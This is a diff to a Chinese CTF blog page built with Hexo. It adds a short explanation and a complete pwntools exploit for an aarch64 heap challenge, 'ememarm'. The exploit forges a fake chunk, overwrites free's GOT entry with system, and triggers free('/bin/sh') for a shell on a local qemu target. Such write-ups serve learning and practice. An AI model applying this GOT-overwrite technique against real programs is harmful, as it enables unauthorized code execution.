@@ -36,7 +36,7 @@
   
 <link rel="stylesheet" href="/css/post.css">
 
-</head>
+<meta name="generator" content="Hexo 7.2.0"></head>
 
 <body>
   <header class="header">
@@ -765,6 +765,71 @@ make install</code></pre>
 <p><img src="https://cdn.jsdelivr.net/gh/tw11ty/MyPic/img202407142046659.png" alt="image-20240714204402367"></p>
 <p>可惜pwngdb里面的命令会报错 或是不正确反映，以后看看能不能搞搞这个（搁着先）</p>
 <p><img src="https://cdn.jsdelivr.net/gh/tw11ty/MyPic/img202407142103556.png" alt="image-20240714210328489"></p>
+<p>创造一个fake chunk，然后任意写改free_got为system，退出执行free(‘&#x2F;bin&#x2F;sh’)</p>
+<pre><code class="highlight python"><span class="comment"># coding = utf-8</span>
+<span class="keyword">from</span> pwn <span class="keyword">import</span> *
+<span class="keyword">from</span> tw11ty <span class="keyword">import</span> *
+<span class="comment">#from ctypes import *</span>
+
+<span class="keyword">def</span> <span class="title function_">menu</span>(<span class="params">num</span>):
+    sla(<span class="string">b&#x27;you choice: \n&#x27;</span>, <span class="built_in">str</span>(num))
+
+<span class="keyword">def</span> <span class="title function_">add0</span>(<span class="params">cx=<span class="string">b&#x27;a&#x27;</span>, cy=<span class="string">b&#x27;b&#x27;</span>, ori=<span class="number">0</span></span>):
+    menu(<span class="number">1</span>)
+    sla(<span class="string">b&#x27;cx:\n&#x27;</span>, cx)
+    sla(<span class="string">b&#x27;cy:\n&#x27;</span>, cy)
+    sla(<span class="string">b&#x27;do you want delete?\n&#x27;</span>, <span class="built_in">str</span>(ori))
+
+<span class="keyword">def</span> <span class="title function_">show</span>(<span class="params">idx</span>):
+    menu(<span class="number">2</span>)
+    sl(<span class="built_in">str</span>(idx))
+
+<span class="keyword">def</span> <span class="title function_">dele</span>(<span class="params">idx, content=<span class="string">b&#x27;&#x27;</span></span>):
+    menu(<span class="number">3</span>)
+    sl(<span class="built_in">str</span>(idx))
+    s(content)
+
+
+<span class="keyword">def</span> <span class="title function_">add1</span>(<span class="params">cx=<span class="string">b&#x27;c&#x27;</span>, cy=<span class="string">b&#x27;d&#x27;</span>, ori=<span class="number">0</span></span>):
+    menu(<span class="number">4</span>)
+    sla(<span class="string">b&#x27;cx:\n&#x27;</span>, cx)
+    sla(<span class="string">b&#x27;cy:\n&#x27;</span>, cy)
+    sla(<span class="string">b&#x27;do you want delete?\n&#x27;</span>, <span class="built_in">str</span>(ori))
+
+<span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span> :
+    <span class="comment"># context.log_level = &#x27;info&#x27;</span>
+    context.arch = <span class="string">&#x27;aarch64&#x27;</span>
+    IPort = <span class="string">&#x27;127.0.0.1 12345&#x27;</span>
+    pwnfile = <span class="string">&#x27;./ememarm&#x27;</span>
+    libc_name = <span class="string">&#x27;./lib/libc.so.6&#x27;</span>
+    elf  = ELF(pwnfile)
+    libc = ELF(libc_name)
+
+    <span class="comment"># io = initc(pwnfile, IPort, &#x27;qemu-aarch64 -L ./ -g 12345 ./ememarm&#x27;)</span>
+    io = initc(pwnfile, IPort, <span class="string">&#x27;qemu-aarch64 -L ./ ./ememarm&#x27;</span>)
+    <span class="comment"># gdb.attach((&#x27;127.0.0.1&#x27;, 12345), &#x27;b *_start&#x27;, pwnfile)</span>
+    <span class="comment"># dbg(&quot;b *0x00400D40 &quot;)</span>
+
+    sla(<span class="string">b&#x27;hello every one welcom my note  ~~4268144\n&#x27;</span>, <span class="string">b&#x27;/bin/sh\x00&#x27;</span>)
+
+    add0(<span class="string">b&#x27;aaaa&#x27;</span>, <span class="string">b&#x27;bbbb&#x27;</span>, <span class="number">0</span>)
+    add0(<span class="string">b&#x27;cccc&#x27;</span>, <span class="string">b&#x27;dddd&#x27;</span>, <span class="number">0</span>)
+    add0(<span class="string">b&#x27;eeee&#x27;</span>, <span class="string">b&#x27;ffff&#x27;</span>, <span class="number">1</span>)
+
+    add1(<span class="string">b&#x27;gggg&#x27;</span>, p64(<span class="number">0x31</span>), <span class="number">1</span>)
+    dele(<span class="number">1</span>, p64(<span class="number">0</span>) + p64(<span class="number">0x41</span>) + <span class="string">b&#x27;deadbeef&#x27;</span>)
+    add1(<span class="string">b&#x27;hhhh&#x27;</span>, p64(elf.got[<span class="string">&#x27;free&#x27;</span>]), <span class="number">0</span>)
+
+    dele(<span class="number">2</span>, p64(<span class="number">0x4000831000</span> + libc.sym[<span class="string">&#x27;system&#x27;</span>]))
+    menu(<span class="number">5</span>)
+
+    itr()
+</code></pre>
+
+
+
+
+
 <h1 id="题目六：aarch64架构-格式化字符串"><a href="#题目六：aarch64架构-格式化字符串" class="headerlink" title="题目六：aarch64架构 格式化字符串"></a>题目六：aarch64架构 格式化字符串<a id="fmt"></a></h1><p>WKCTF2024  something_changed  </p>
 <p>漏洞还是很简单，存在栈溢出和格式化字符串漏洞</p>
 <p><img src="https://cdn.jsdelivr.net/gh/tw11ty/MyPic/img202407141932654.png" alt="image-20240714193242494"></p>
